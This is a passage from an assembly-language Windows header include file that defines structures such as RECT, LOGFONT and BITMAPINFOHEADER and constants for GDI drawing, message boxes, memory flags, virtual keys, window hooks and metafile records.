  lvht_iItem  DWORD      ?
LV_HITTESTINFO ENDS

LV_COLUMN STRUC
  lvc_imask  DWORD      ?
  lvc_fmt  DWORD      ?
  lvc_lx  DWORD      ?
  lvc_pszText  DWORD      ?
  lvc_cchTextMax  DWORD      ?
  lvc_iSubItem  DWORD      ?
LV_COLUMN ENDS

;*******************************************************************
;
;       Rectangle
;
;*******************************************************************

RECT    struc
        rcLeft          dd      ?
        rcTop           dd      ?
        rcRight         dd      ?
        rcBottom        dd      ?
RECT    ends

;*******************************************************************
;
;  Window Class structure
;
;*******************************************************************

WNDCLASS struc
        clsStyle        dw      ?       ; class style
        clsLpfnWndProc  dd      ?
        clsCbClsExtra   dw      ?
        clsCbWndExtra   dw      ?
        clsHInstance    dw      ?       ; instance handle
        clsHIcon        dw      ?       ; class icon handle
        clsHCursor      dw      ?       ; class cursor handle
        clsHbrBackground dw     ?       ; class background brush
        clsLpszMenuName dd      ?       ; menu name
        clsLpszClassName dd     ?       ; far ptr to class name
WNDCLASS ends

IFNDEF NOTEXT
TEXTMETRIC struc
    tmHeight        dw      ?
    tmAscent        dw      ?
    tmDescent       dw      ?
    tmIntLeading    dw      ?
    tmExtLeading    dw      ?
    tmAveCharWidth  dw      ?
    tmMaxCharWidth  dw      ?
    tmWeight        dw      ?
    tmItalic        db      ?
    tmUnderlined    db      ?
    tmStruckOut     db      ?
    tmFirstChar     db      ?
    tmLastChar      db      ?
    tmDefaultChar   db      ?
    tmBreakChar     db      ?
    tmPitch         db      ?
    tmCharSet       db      ?
    tmOverhang      dw      ?
    tmAspectX       dw      ?
    tmAspectY       dw      ?
TEXTMETRIC ends

LF_FACESIZE     EQU     32

LOGFONT struc
    lfHeight          dw   ?
    lfWidth           dw   ?
    lfEscapement      dw   ?
    lfOrientation     dw   ?
    lfWeight          dw   ?
    lfItalic          db   ?
    lfUnderline       db   ?
    lfStrikeOut       db   ?
    lfCharSet         db   ?
    lfOutPrecision    db   ?
    lfClipPrecision   db   ?
    lfQuality         db   ?
    lfPitchAndFamily  db   ?
    lfFaceName        db   LF_FACESIZE dup(?)
LOGFONT ends

LOGBRUSH struc
    lbStyle         dw ?
    lbColor         dd ?
    lbHatch         dw ?
LOGBRUSH ends

;
;  Text Drawing modes
;
TRANSPARENT     = 1
OPAQUE          = 2
;
; Mapping Modes
;
MM_TEXT         =   1
MM_LOMETRIC     =   2
MM_HIMETRIC     =   3
MM_LOENGLISH    =   4
MM_HIENGLISH    =   5
MM_TWIPS        =   6
MM_ISOTROPIC    =   7
MM_ANISOTROPIC  =   8
;
; Coordinate Modes
;
ABSOLUTE        =   1
RELATIVE        =   2
;
;  Stock Logical Objects
;
WHITE_BRUSH         =  0
LTGRAY_BRUSH        =  1
GRAY_BRUSH          =  2
DKGRAY_BRUSH        =  3
BLACK_BRUSH         =  4
NULL_BRUSH          =  5
HOLLOW_BRUSH        =  5
WHITE_PEN           =  6
BLACK_PEN           =  7
NULL_PEN            =  8
DOT_MARKER          =  9
OEM_FIXED_FONT      = 10
ANSI_FIXED_FONT     = 11
ANSI_VAR_FONT       = 12
SYSTEM_FONT         = 13
DEVICE_DEFAULT_FONT = 14
DEFAULT_PALETTE     = 15
SYSTEM_FIXED_FONT   = 16
ENDIF
;
; Brush Styles
;
BS_SOLID        =   0
BS_NULL         =   1
BS_HOLLOW       =   BS_NULL
BS_HATCHED      =   2
BS_PATTERN      =   3
BS_INDEXED      =   4
BS_DIBPATTERN   =   5
;
; Hatch Styles
;
HS_HORIZONTAL   =   0       ; -----
HS_VERTICAL     =   1       ; |||||
HS_FDIAGONAL    =   2       ; \\\\\
HS_BDIAGONAL    =   3       ; /////
HS_CROSS        =   4       ; +++++
HS_DIAGCROSS    =   5       ; xxxxx
;
; Pen Styles
;
PS_SOLID        =   0
PS_DASH         =   1       ; -------
PS_DOT          =   2       ; .......
PS_DASHDOT      =   3       ; _._._._
PS_DASHDOTDOT   =   4       ; _.._.._
PS_NULL         =   5
PS_INSIDEFRAME  =   6
;
; Device Parameters for GetDeviceCaps()
;
DRIVERVERSION =0     ; Device driver version
TECHNOLOGY    =2     ; Device classification
HORZSIZE      =4     ; Horizontal size in millimeters
VERTSIZE      =6     ; Vertical size in millimeters
HORZRES       =8     ; Horizontal width in pixels
VERTRES       =10    ; Vertical width in pixels
BITSPIXEL     =12    ; Number of bits per pixel
PLANES        =14    ; Number of planes
NUMBRUSHES    =16    ; Number of brushes the device has
NUMPENS       =18    ; Number of pens the device has
NUMMARKERS    =20    ; Number of markers the device has
NUMFONTS      =22    ; Number of fonts the device has
NUMCOLORS     =24    ; Number of colors the device supports
PDEVICESIZE   =26    ; Size required for device descriptor
CURVECAPS     =28    ; Curve capabilities
LINECAPS      =30    ; Line capabilities
POLYGONALCAPS =32    ; Polygonal capabilities
TEXTCAPS      =34    ; Text capabilities
CLIPCAPS      =36    ; Clipping capabilities
RASTERCAPS    =38    ; Bitblt capabilities
ASPECTX       =40    ; Length of the X leg
ASPECTY       =42    ; Length of the Y leg
ASPECTXY      =44    ; Length of the hypotenuse

LOGPIXELSX    =88    ; Logical pixels/inch in X
LOGPIXELSY    =90    ; Logical pixels/inch in Y

SIZEPALETTE   =104   ; Number of entries in physical palette
NUMRESERVED   =106   ; Number of reserved entries in palette
COLORRES      =108   ; Actual color resolution
;
ifndef NOGDICAPMASKS
;
; Device Capability Masks:
;
; Device Technologies
DT_PLOTTER       =   0  ; /* Vector plotter                   */
DT_RASDISPLAY    =   1  ; /* Raster display                   */
DT_RASPRINTER    =   2  ; /* Raster printer                   */
DT_RASCAMERA     =   3  ; /* Raster camera                    */
DT_CHARSTREAM    =   4  ; /* Character-stream, PLP            */
DT_METAFILE      =   5  ; /* Metafile, VDM                    */
DT_DISPFILE      =   6  ; /* Display-file                     */
;
; Curve Capabilities
CC_NONE          =   0  ; /* Curves not supported             */
CC_CIRCLES       =   1  ; /* Can do circles                   */
CC_PIE           =   2  ; /* Can do pie wedges                */
CC_CHORD         =   4  ; /* Can do chord arcs                */
CC_ELLIPSES      =   8  ; /* Can do ellipese                  */
CC_WIDE          =   16 ; /* Can do wide lines                */
CC_STYLED        =   32 ; /* Can do styled lines              */
CC_WIDESTYLED    =   64 ; /* Can do wide styled lines         */
CC_INTERIORS     =   128; /* Can do interiors                 */
;
; Line Capabilities
LC_NONE          =   0  ; /* Lines not supported              */
LC_POLYLINE      =   2  ; /* Can do polylines                 */
LC_MARKER        =   4  ; /* Can do markers                   */
LC_POLYMARKER    =   8  ; /* Can do polymarkers               */
LC_WIDE          =   16 ; /* Can do wide lines                */
LC_STYLED        =   32 ; /* Can do styled lines              */
LC_WIDESTYLED    =   64 ; /* Can do wide styled lines         */
LC_INTERIORS     =   128; /* Can do interiors                 */
;
; Polygonal Capabilities
PC_NONE          =   0  ; /* Polygonals not supported         */
PC_POLYGON       =   1  ; /* Can do polygons                  */
PC_RECTANGLE     =   2  ; /* Can do rectangles                */
PC_WINDPOLYGON   =   4  ; /* Can do winding polygons          */
PC_TRAPEZOID     =   4  ; /* Can do trapezoids                */
PC_SCANLINE      =   8  ; /* Can do scanlines                 */
PC_WIDE          =   16 ; /* Can do wide borders              */
PC_STYLED        =   32 ; /* Can do styled borders            */
PC_WIDESTYLED    =   64 ; /* Can do wide styled borders       */
PC_INTERIORS     =   128; /* Can do interiors                 */
;
; Polygonal Capabilities */
CP_NONE          =   0  ; /* No clipping of output            */
CP_RECTANGLE     =   1  ; /* Output clipped to rects          */
;
; Text Capabilities
TC_OP_CHARACTER  =   0001h ; /* Can do OutputPrecision   CHARACTER      */
TC_OP_STROKE     =   0002h ; /* Can do OutputPrecision   STROKE         */
TC_CP_STROKE     =   0004h ; /* Can do ClipPrecision     STROKE         */
TC_CR_90         =   0008h ; /* Can do CharRotAbility    90             */
TC_CR_ANY        =   0010h ; /* Can do CharRotAbility    ANY            */
TC_SF_X_YINDEP   =   0020h ; /* Can do ScaleFreedom      X_YINDEPENDENT */
TC_SA_DOUBLE     =   0040h ; /* Can do ScaleAbility      DOUBLE         */
TC_SA_INTEGER    =   0080h ; /* Can do ScaleAbility      INTEGER        */
TC_SA_CONTIN     =   0100h ; /* Can do ScaleAbility      CONTINUOUS     */
TC_EA_DOUBLE     =   0200h ; /* Can do EmboldenAbility   DOUBLE         */
TC_IA_ABLE       =   0400h ; /* Can do ItalisizeAbility  ABLE           */
TC_UA_ABLE       =   0800h ; /* Can do UnderlineAbility  ABLE           */
TC_SO_ABLE       =   1000h ; /* Can do StrikeOutAbility  ABLE           */
TC_RA_ABLE       =   2000h ; /* Can do RasterFontAble    ABLE           */
TC_VA_ABLE       =   4000h ; /* Can do VectorFontAble    ABLE           */
TC_RESERVED      =   8000h
;
; Raster Capabilities
RC_BITBLT        =   1      ; /* Can do standard BLT.             */
RC_BANDING       =   2      ; /* Device requires banding support  */
RC_SCALING       =   4      ; /* Device requires scaling support  */
RC_BITMAP64      =   8      ; /* Device can support >64K bitmap   */
RC_GDI20_OUTPUT  =   0010h  ; /* has 2.0 output calls         */
RC_DI_BITMAP     =   0080h  ; /* supports DIB to memory       */
RC_PALETTE       =   0100h  ; /* supports a palette           */
RC_DIBTODEV      =   0200h  ; /* supports DIBitsToDevice      */
RC_BIGFONT       =   0400h  ; /* supports >64K fonts          */
RC_STRETCHBLT    =   0800h  ; /* supports StretchBlt          */
RC_FLOODFILL     =   1000h  ; /* supports FloodFill           */
RC_STRETCHDIB    =   2000h  ; /* supports StretchDIBits       */

endif       ;NOGDICAPMASKS

; palette entry flags
;
PC_RESERVED     = 1    ;/* palette index used for animation */
PC_EXPLICIT     = 2    ;/* palette index is explicit to device */
PC_NOCOLLAPSE   = 4    ;/* do not match color to system palette */

; DIB color table identifiers
;
DIB_RGB_COLORS  = 0    ;/* color table in RGBTriples */
DIB_PAL_COLORS  = 1    ;/* color table in palette indices */
;

;constants for Get/SetSystemPaletteUse()
;
SYSPAL_STATIC   = 1
SYSPAL_NOSTATIC = 2

; constants for CreateDIBitmap
CBM_INIT        = 4    ;/* initialize bitmap */
;
; Bitmap format constants
BI_RGB          = 0
BI_RLE8         = 1
BI_RLE4         = 2
;
;
ANSI_CHARSET    = 0
SYMBOL_CHARSET  = 2
OEM_CHARSET     = 255
;
;  styles for CombineRgn
;
RGN_AND  = 1
RGN_OR   = 2
RGN_XOR  = 3
RGN_DIFF = 4
RGN_COPY = 5
;
;  Predefined cursor & icon IDs
;
IDC_ARROW       = 32512
IDC_IBEAM       = 32513
IDC_WAIT        = 32514
IDC_CROSS       = 32515
IDC_UPARROW     = 32516
IDC_SIZE        = 32640
IDC_ICON        = 32641
IDC_SIZENWSE    = 32642
IDC_SIZENESW    = 32643
IDC_SIZEWE      = 32644
IDC_SIZENS      = 32645

IDI_APPLICATION = 32512
IDI_HAND        = 32513
IDI_QUESTION    = 32514
IDI_EXCLAMATION = 32515
IDI_ASTERISK    = 32516

;
; OEM Resource Ordinal Numbers */
;
OBM_CLOSE         =  32754
OBM_UPARROW       =  32753
OBM_DNARROW       =  32752
OBM_RGARROW       =  32751
OBM_LFARROW       =  32750
OBM_REDUCE        =  32749
OBM_ZOOM          =  32748
OBM_RESTORE       =  32747
OBM_REDUCED       =  32746
OBM_ZOOMD         =  32745
OBM_RESTORED      =  32744
OBM_UPARROWD      =  32743
OBM_DNARROWD      =  32742
OBM_RGARROWD      =  32741
OBM_LFARROWD      =  32740
OBM_MNARROW       =  32739
OBM_COMBO         =  32738
OBM_UPARROWI      =  32737
OBM_DNARROWI      =  32736
OBM_RGARROWI      =  32735
OBM_LFARROWI      =  32734

OBM_OLD_CLOSE     =  32767
OBM_SIZE          =  32766
OBM_OLD_UPARROW   =  32765
OBM_OLD_DNARROW   =  32764
OBM_OLD_RGARROW   =  32763
OBM_OLD_LFARROW   =  32762
OBM_BTSIZE        =  32761
OBM_CHECK         =  32760
OBM_CHECKBOXES    =  32759
OBM_BTNCORNERS    =  32758
OBM_OLD_REDUCE    =  32757
OBM_OLD_ZOOM      =  32756
OBM_OLD_RESTORE   =  32755

OCR_NORMAL        =  32512
OCR_IBEAM         =  32513
OCR_WAIT          =  32514
OCR_CROSS         =  32515
OCR_UP            =  32516
OCR_SIZE          =  32640
OCR_ICON          =  32641
OCR_SIZENWSE      =  32642
OCR_SIZENESW      =  32643
OCR_SIZEWE        =  32644
OCR_SIZENS        =  32645
OCR_SIZEALL       =  32646
OCR_ICOCUR        =  32647

OIC_SAMPLE        =  32512
OIC_HAND          =  32513
OIC_QUES          =  32514
OIC_BANG          =  32515
OIC_NOTE          =  32516

;
;   Scroll bar constants
;
SB_HORZ = 0
SB_VERT = 1
SB_CTL  = 2
SB_BOTH = 3
;
;   Scroll Commands
;
SB_LINEUP        = 0
SB_LINEDOWN      = 1
SB_PAGEUP        = 2
SB_PAGEDOWN      = 3
SB_THUMBPOSITION = 4
SB_THUMBTRACK    = 5
SB_TOP           = 6
SB_BOTTOM        = 7
SB_ENDSCROLL     = 8
;
;  MessageBox type flags
;
IFNDEF                  NOMB
MB_OK                   = 0000H
MB_OKCANCEL             = 0001H
MB_ABORTRETRYIGNORE     = 0002H
MB_YESNOCANCEL          = 0003H
MB_YESNO                = 0004H
MB_RETRYCANCEL          = 0005H

MB_ICONHAND             = 0010H
MB_ICONQUESTION         = 0020H
MB_ICONEXCLAMATION      = 0030H
MB_ICONASTERISK         = 0040H

MB_DEFBUTTON1           = 0000H
MB_DEFBUTTON2           = 0100H
MB_DEFBUTTON3           = 0200H

MB_APPLMODAL            = 0000H
MB_SYSTEMMODAL          = 1000H
MB_TASKMODAL            = 2000H

MB_NOFOCUS              = 8000H

;
;  Conventional dialog box and message box command IDs
;
IDOK     =   1
IDCANCEL =   2
IDABORT  =   3
IDRETRY  =   4
IDIGNORE =   5
IDYES    =   6
IDNO     =   7
;
;  Flags for OpenFile
;
OF_READ             = 0000H
OF_WRITE            = 0001H
OF_READWRITE        = 0002H
OF_SHARE_COMPAT     = 0000H
OF_SHARE_EXCLUSIVE  = 0010H
OF_SHARE_DENY_WRITE = 0020H
OF_SHARE_DENY_READ  = 0030H
OF_SHARE_DENY_NONE  = 0040H
OF_PARSE            = 0100H
OF_DELETE           = 0200H
OF_VERIFY           = 0400H     ; Used with OF_REOPEN
OF_SEARCH           = 0400H     ; Used without OF_REOPEN
OF_CANCEL           = 0800H
OF_CREATE           = 1000H
OF_PROMPT           = 2000H
OF_EXIST            = 4000H
OF_REOPEN           = 8000H

TF_FORCEDRIVE   = 80H

OPENSTRUC       STRUC
opLen   db      ?
opDisk  db      ?
opXtra  dw      ?
opDate  dw      ?
opTime  dw      ?
opFile  db      120 dup (?)
OPENSTRUC       ENDS
;
;  DrawText format flags
;
DT_LEFT         = 00H
DT_CENTER       = 01H
DT_RIGHT        = 02H
DT_TOP          = 00H
DT_VCENTER      = 04H
DT_BOTTOM       = 08H
DT_WORDBREAK    = 10H
DT_SINGLELINE   = 20H
DT_EXPANDTABS   = 40H
DT_TABSTOP      = 80H
DT_NOCLIP       =    0100H
DT_EXTERNALLEADING = 0200H
DT_CALCRECT     =    0400H
DT_NOPREFIX     =    0800H
DT_INTERNAL     =    1000H
ENDIF

;
; ExtFloodFill style flags
;
FLOODFILLBORDER  =  0
FLOODFILLSURFACE =  1

;
; Memory manager flags
;
LMEM_FIXED      =   0000h
LMEM_MOVEABLE   =   0002h
LMEM_NOCOMPACT  =   0010H
LMEM_NODISCARD  =   0020H
LMEM_ZEROINIT   =   0040h
LMEM_MODIFY     =   0080H
LMEM_DISCARDABLE=   0F00h
LHND    =    LMEM_MOVEABLE+LMEM_ZEROINIT
LPTR    =    LMEM_FIXED+LMEM_ZEROINIT
; Flags returned by LocalFlags (in addition to LMEM_DISCARDABLE)
LMEM_DISCARDED  =   4000H
LMEM_LOCKCOUNT  =   00FFH

NONZEROLHND     =    LMEM_MOVEABLE
NONZEROLPTR     =    LMEM_FIXED



GMEM_FIXED      =   0000h
GMEM_MOVEABLE   =   0002h
GMEM_NOCOMPACT  =   0010h
GMEM_NODISCARD  =   0020h
GMEM_ZEROINIT   =   0040h
GMEM_MODIFY     =   0080h
GMEM_DISCARDABLE=   0100h
GMEM_NOT_BANKED =   1000h
GMEM_DDESHARE   =   2000h
GMEM_SHARE      =   2000h
GMEM_NOTIFY     =   4000h
GMEM_LOWER      =   GMEM_NOT_BANKED
GHND            =   GMEM_MOVEABLE+GMEM_ZEROINIT
GPTR            =   GMEM_FIXED+GMEM_ZEROINIT

; Flags returned by GlobalFlags (in addition to GMEM_DISCARDABLE)
GMEM_DISCARDED  =    4000h
GMEM_LOCKCOUNT  =    00FFh

; Flags returned by GetWinFlags

WF_PMODE        =    0001h
WF_CPU286       =    0002h
WF_CPU386       =    0004h
WF_CPU486       =    0008h
WF_STANDARD     =    0010h
WF_WIN286       =    0010h
WF_ENHANCED     =    0020h
WF_WIN386       =    0020h
WF_CPU086       =    0040h
WF_CPU186       =    0080h
WF_LARGEFRAME   =    0100h
WF_SMALLFRAME   =    0200h
WF_80x87        =    0400h
WF_PAGING       =    0800h
WF_WLO          =    8000h

; WEP fSystemExit flag values
WEP_SYSTEM_EXIT =       1
WEP_FREE_DLL    =       0


;  Virtual Keys, Standard Set

IFNDEF          NOVK
VK_LBUTTON      = 01H
VK_RBUTTON      = 02H
VK_CANCEL       = 03H
VK_BACK         = 08H
VK_TAB          = 09H
VK_CLEAR        = 0cH
VK_RETURN       = 0dH
VK_SHIFT        = 10H
VK_CONTROL      = 11H
VK_MENU         = 12H
VK_PAUSE        = 13H
VK_CAPITAL      = 14H
VK_ESCAPE       = 1bH
VK_SPACE        = 20H

VK_PRIOR        = 21H
VK_NEXT         = 22H
VK_END          = 23H
VK_HOME         = 24H
VK_LEFT         = 25H
VK_UP           = 26H
VK_RIGHT        = 27H
VK_DOWN         = 28H

;  VK_A thru VK_Z are the same as their ASCII equivalents: 'A' thru 'Z'
;  VK_0 thru VK_9 are the same as their ASCII equivalents: '0' thru '0'

VK_PRINT        = 2aH
VK_EXECUTE      = 2bH
VK_SNAPSHOT     = 2ch   ; Printscreen key..
VK_INSERT       = 2dH
VK_DELETE       = 2eH
VK_HELP         = 2fH

VK_NUMPAD0      = 60H
VK_NUMPAD1      = 61H
VK_NUMPAD2      = 62H
VK_NUMPAD3      = 63H
VK_NUMPAD4      = 64H
VK_NUMPAD5      = 65H
VK_NUMPAD6      = 66H
VK_NUMPAD7      = 67H
VK_NUMPAD8      = 68H
VK_NUMPAD9      = 69H
VK_MULTIPLY     = 6AH
VK_ADD          = 6BH
VK_SEPARATER    = 6CH
VK_SUBTRACT     = 6DH
VK_DECIMAL      = 6EH
VK_DIVIDE       = 6FH

VK_F1           = 70H
VK_F2           = 71H
VK_F3           = 72H
VK_F4           = 73H
VK_F5           = 74H
VK_F6           = 75H
VK_F7           = 76H
VK_F8           = 77H
VK_F9           = 78H
VK_F10          = 79H
VK_F11          = 7aH
VK_F12          = 7bH
VK_F13          = 7cH
VK_F14          = 7dH
VK_F15          = 7eH
VK_F16          = 7fH
VK_F17          = 80H
VK_F18          = 81H
VK_F19          = 82H
VK_F20          = 83H
VK_F21          = 84H
VK_F22          = 85H
VK_F23          = 86H
VK_F24          = 87H

VK_NUMLOCK      = 90H
VK_SCROLL       = 91H
ENDIF

IFNDEF NOWH

; SetWindowsHook() codes
WH_MSGFILTER       = (-1)
WH_JOURNALRECORD   = 0
WH_JOURNALPLAYBACK = 1
WH_KEYBOARD        = 2
WH_GETMESSAGE      = 3
WH_CALLWNDPROC     = 4
IFNDEF NOWIN31
WH_CBT             = 5
WH_SYSMSGFILTER    = 6
WH_MOUSE           = 7
WH_HARDWARE        = 8
WH_DEBUG           = 9
ENDIF
;
; Hook Codes
HC_GETLPLPFN       = (-3)
HC_LPLPFNNEXT      = (-2)
HC_LPFNNEXT        = (-1)
HC_ACTION          = 0
HC_GETNEXT         = 1
HC_SKIP            = 2
HC_NOREM           = 3
HC_NOREMOVE        = 3
HC_SYSMODALON      = 4
HC_SYSMODALOFF     = 5
;
; CBT Hook Codes
HCBT_MOVESIZE      = 0
HCBT_MINMAX        = 1
HCBT_QS            = 2
HCBT_CREATEWND     = 3
HCBT_DESTROYWND    = 4
HCBT_ACTIVATE      = 5
HCBT_CLICKSKIPPED  = 6
HCBT_KEYSKIPPED    = 7
HCBT_SYSCOMMAND    = 8
HCBT_SETFOCUS      = 9

;
; WH_MSGFILTER Filter Proc Codes
MSGF_DIALOGBOX     = 0
MSGF_MENU          = 2
MSGF_MOVE          = 3
MSGF_SIZE          = 4
MSGF_SCROLLBAR     = 5
MSGF_NEXTWINDOW    = 6
;
; Window Manager Hook Codes
WC_INIT            = 1
WC_SWP             = 2
WC_DEFWINDOWPROC   = 3
WC_MINMAX          = 4
WC_MOVE            = 5
WC_SIZE            = 6
WC_DRAWCAPTION     = 7
;

; Message Structure used in Journaling
EVENTMSG    struc
    message     dw ?
    paramL      dw ?
    paramH      dw ?
    time        dd ?
EVENTMSG    ends

ENDIF ;NOWH

; Window field offsets for GetWindowLong() and GetWindowWord()
GWL_WNDPROC       =  (-4)
GWW_HINSTANCE     =  (-6)
GWW_HWNDPARENT    =  (-8)
GWW_ID            =  (-12)
GWL_STYLE         =  (-16)
GWL_EXSTYLE       =  (-20)

; GetWindow() Constants
GW_HWNDFIRST      =  0
GW_HWNDLAST       =  1
GW_HWNDNEXT       =  2
GW_HWNDPREV       =  3
GW_OWNER          =  4
GW_CHILD          =  5

; Class field offsets for GetClassLong() and GetClassWord()
GCL_MENUNAME      =  (-8)
GCW_HBRBACKGROUND =  (-10)
GCW_HCURSOR       =  (-12)
GCW_HICON         =  (-14)
GCW_HMODULE       =  (-16)
GCW_CBWNDEXTRA    =  (-18)
GCW_CBCLSEXTRA    =  (-20)
GCL_WNDPROC       =  (-24)
GCW_STYLE         =  (-26)

; WinWhere() Area Codes
HTERROR           =  (-2)
HTTRANSPARENT     =  (-1)
HTNOWHERE         =  0
HTCLIENT          =  1
HTCAPTION         =  2
HTSYSMENU         =  3
HTGROWBOX         =  4
HTSIZE            =  HTGROWBOX
HTMENU            =  5
HTHSCROLL         =  6
HTVSCROLL         =  7
HTREDUCE          =  8
HTZOOM            =  9
HTLEFT            =  10
HTRIGHT           =  11
HTTOP             =  12
HTTOPLEFT         =  13
HTTOPRIGHT        =  14
HTBOTTOM          =  15
HTBOTTOMLEFT      =  16
HTBOTTOMRIGHT     =  17
HTSIZEFIRST       =  HTLEFT
HTSIZELAST        =  HTBOTTOMRIGHT



;*************************************************************************
;
;       Misc structures & constants
;
;*************************************************************************

IFNDEF  NOMST
POINT   struc
        ptX             dw      ?
        ptY             dw      ?
POINT   ends

LOGPEN struc
    lopnStyle       dw ?
    lopnWidth       db (SIZE POINT) DUP(?)
    lopnColor       dd ?
LOGPEN ends


BITMAP STRUC
        bmType         DW ?
        bmWidth        DW ?
        bmHeight       DW ?
        bmWidthBytes   DW ?
        bmPlanes       DB ?
        bmBitsPixel    DB ?
        bmBits         DD ?
BITMAP ENDS

RGBTRIPLE       struc
        rgbBlue         db ?
        rgbGreen        db ?
        rgbRed          db ?
RGBTRIPLE       ends

RGBQUAD         struc
        rgbqBlue        db ?
        rgbqGreen       db ?
        rgbqRed         db ?
        rgbqReserved    db ?
RGBQUAD         ends

; structures for defining DIBs
BITMAPCOREHEADER struc
        bcSize      dd ?
        bcWidth     dw ?
        bcHeight    dw ?
        bcPlanes    dw ?
        bcBitCount  dw ?
BITMAPCOREHEADER ends

BITMAPINFOHEADER struc
        biSize           dd ?
        biWidth          dd ?
        biHeight         dd ?
        biPlanes         dw ?
        biBitCount       dw ?

        biCompression    dd ?
        biSizeImage      dd ?
        biXPelsPerMeter  dd ?
        biYPelsPerMeter  dd ?
        biClrUsed        dd ?
        biClrImportant   dd ?
BITMAPINFOHEADER ends

BITMAPINFO  struc
    bmiHeader   db (SIZE BITMAPINFOHEADER) DUP (?)
    bmiColors   db ?            ; array of RGBQUADs
BITMAPINFO  ends

BITMAPCOREINFO  struc
    bmciHeader  db (SIZE BITMAPCOREHEADER) DUP (?)
    bmciColors  db ?            ; array of RGBTRIPLEs
BITMAPCOREINFO  ends

BITMAPFILEHEADER struc
    bfType          dw ?
    bfSize          dd ?
    bfReserved1     dw ?
    bfReserved2     dw ?
    bfOffBits       dd ?
BITMAPFILEHEADER ends


WNDSTRUC struc
        WSwndStyle        dd      ?
        WSwndID           dw      ?
        WSwndText         dw      ?
        WSwndParent       dw      ?
        WSwndInstance     dw      ?
        WSwndClassProc    dd      ?
WNDSTRUC ends
;
;  Message structure
;
MSGSTRUCT       struc
msHWND          dw      ?
msMESSAGE       dw      ?
msWPARAM        dw      ?
msLPARAM        dd      ?
msTIME          dd      ?
msPT            dd      ?
MSGSTRUCT       ends

NEWPARMS struc
        nprmHwnd        dw      ?
        nprmCmd         db      ?
NEWPARMS ends
ENDIF

PAINTSTRUCT STRUC
    PShdc         DW ?
    PSfErase      DW ?
    PSrcPaint     DB size RECT dup(?)
    PSfRestore    DW ?
    PSfIncUpdate  DW ?
    PSrgbReserved DB 16 dup(?)
PAINTSTRUCT ENDS


CREATESTRUCT struc
    cs_lpCreateParams  dd ?
    cs_hInstance       dw ?
    cs_hMenu           dw ?
    cs_hwndParent      dw ?
    cs_cy              dw ?
    cs_cx              dw ?
    cs_y               dw ?
    cs_x               dw ?
    cs_style           dd ?
    cs_lpszName        dd ?
    cs_lpszClass       dd ?
    cs_dwExStyle       dd ?
CREATESTRUCT  ends
;
;       PostError constants
;
WARNING     = 0           ; command codes
MINOR_ERROR = 1
FATAL_ERROR = 2

IGNORE      = 0           ; response codes
RETRY       = 1
ABORT       = 2
;
; GDI-related constants & commands
;
ERRORREGION     = 0
NULLREGION      = 1
SIMPLEREGION    = 2
COMPLEXREGION   = 3

IFNDEF NORASTOPS
;
; Binary raster ops
;
R2_BLACK        =  1
R2_NOTMERGEPEN  =  2
R2_MASKNOTPEN   =  3
R2_NOTCOPYPEN   =  4
R2_MASKPENNOT   =  5
R2_NOT          =  6
R2_XORPEN       =  7
R2_NOTMASKPEN   =  8
R2_MASKPEN      =  9
R2_NOTXORPEN    = 10
R2_NOP          = 11
R2_MERGENOTPEN  = 12
R2_COPYPEN      = 13
R2_MERGEPENNOT  = 14
R2_MERGEPEN     = 15
R2_WHITE        = 16
;
; Ternary raster ops
;
SRCCOPY_L     = 0020h   ;dest=source
SRCCOPY_H     = 00CCh
SRCPAINT_L    = 0086h   ;dest=source OR dest
SRCPAINT_H    = 00EEh
SRCAND_L      = 00C6h   ;dest=source AND   dest
SRCAND_H      = 0088h
SRCINVERT_L   = 0046h   ;dest= source XOR      dest
SRCINVERT_H   = 0066h
SRCERASE_L    = 0328h   ;dest= source AND (not dest )
SRCERASE_H    = 0044h
NOTSRCCOPY_L  = 0008h   ;dest= (not source)
NOTSRCCOPY_H  = 0033h
NOTSRCERASE_L = 00A6h   ;dest= (not source) AND (not dest)
NOTSRCERASE_H = 0011h
MERGECOPY_L   = 00CAh   ;dest= (source AND pattern)
MERGECOPY_H   = 00C0h
MERGEPAINT_L  = 0226h   ;dest= (source AND pattern) OR dest
MERGEPAINT_H  = 00BBh
PATCOPY_L     = 0021h   ;dest= pattern
PATCOPY_H     = 00F0h
PATPAINT_L    = 0A09h   ;DPSnoo
PATPAINT_H    = 00FBh
PATINVERT_L   = 0049h   ;dest= pattern XOR     dest
PATINVERT_H   = 005Ah
DSTINVERT_L   = 0009h   ;dest= (not dest)
DSTINVERT_H   = 0055h
BLACKNESS_L   = 0042h   ;dest= BLACK
BLACKNESS_H   = 0000h
WHITENESS_L   = 0062h   ;dest= WHITE
WHITENESS_H   = 00FFh
;
; StretchBlt modes
;
BLACKONWHITE    = 1
WHITEONBLACK    = 2
COLORONCOLOR    = 3
;
; New StretchBlt modes
;
STRETCH_ANDSCANS    = 1
STRETCH_ORSCANS     = 2
STRETCH_DELETESCANS = 3
;
; PolyFill modes
;
ALTERNATE       = 1
WINDING         = 2
ENDIF
;
; Text Alignment Options
;
TA_NOUPDATECP   =  0
TA_UPDATECP     =  1

TA_LEFT         =  0
TA_RIGHT        =  2
TA_CENTER       =  6

TA_TOP          =  0
TA_BOTTOM       =  8
TA_BASELINE     =  24

ETO_GRAYED      =  1
ETO_OPAQUE      =  2
ETO_CLIPPED     =  4

ASPECT_FILTERING = 1

ifndef NOMETAFILE

; Metafile Functions */
META_SETBKCOLOR            =  0201h
META_SETBKMODE             =  0102h
META_SETMAPMODE            =  0103h
META_SETROP2               =  0104h
META_SETRELABS             =  0105h
META_SETPOLYFILLMODE       =  0106h
META_SETSTRETCHBLTMODE     =  0107h
META_SETTEXTCHAREXTRA      =  0108h
META_SETTEXTCOLOR          =  0209h
META_SETTEXTJUSTIFICATION  =  020Ah
META_SETWINDOWORG          =  020Bh
META_SETWINDOWEXT          =  020Ch
META_SETVIEWPORTORG        =  020Dh
META_SETVIEWPORTEXT        =  020Eh
META_OFFSETWINDOWORG       =  020Fh
META_SCALEWINDOWEXT        =  0400h
META_OFFSETVIEWPORTORG     =  0211h
META_SCALEVIEWPORTEXT      =  0412h
META_LINETO                =  0213h
META_MOVETO                =  0214h
META_EXCLUDECLIPRECT       =  0415h
META_INTERSECTCLIPRECT     =  0416h
META_ARC                   =  0817h
META_ELLIPSE               =  0418h
META_FLOODFILL             =  0419h
META_PIE                   =  081Ah
META_RECTANGLE             =  041Bh
META_ROUNDRECT             =  061Ch
META_PATBLT                =  061Dh
META_SAVEDC                =  001Eh
META_SETPIXEL              =  041Fh
META_OFFSETCLIPRGN         =  0220h
META_TEXTOUT               =  0521h
META_BITBLT                =  0922h
META_STRETCHBLT            =  0B23h
META_POLYGON               =  0324h
META_POLYLINE              =  0325h
